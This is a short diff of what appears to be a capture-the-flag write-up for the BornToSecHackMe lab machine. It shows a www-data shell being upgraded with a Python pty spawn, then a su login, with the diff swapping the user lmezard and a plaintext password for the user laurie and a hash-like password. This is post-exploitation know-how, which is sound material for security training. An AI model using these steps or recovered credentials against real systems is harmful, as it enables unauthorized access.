@@ -40,7 +40,7 @@ su lmezard
 su: must be run from a terminal
 www-data@BornToSecHackMe:/var/www/forum/templates_c$ python -c 'import pty; pty.spawn("/bin/bash")'
 <ar/www/forum/templates_c$ python -c 'import pty; pty.spawn("/bin/bash")'    
-www-data@BornToSecHackMe:/var/www/forum/templates_c$ su lmezard
-su lmezard
-Password: G!@M6f4Eatau{sF"
+www-data@BornToSecHackMe:/var/www/forum/templates_c$ su laurie
+su laurie
+Password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
